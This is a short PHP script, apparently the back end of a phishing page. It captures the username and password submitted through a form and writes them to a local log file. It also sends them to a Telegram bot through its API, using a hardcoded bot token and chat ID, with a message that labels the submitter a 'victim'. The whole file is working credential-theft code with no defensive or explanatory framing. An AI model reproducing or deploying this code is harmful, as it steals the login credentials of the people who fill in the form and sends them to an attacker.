<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['password']);
    $token = "7632866238:AAFJGMxkD8p18Z8wxnSvf5snHXJN8ZcK9BQ";
    $chat_id = "1559369377";
    $message = "🔥 New G-Boy Victim 🔥\nUsername: $username\nPassword: $password";

    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=".urlencode($message));
    file_put_contents("log.txt", "$username | $password\n", FILE_APPEND);
}
?>
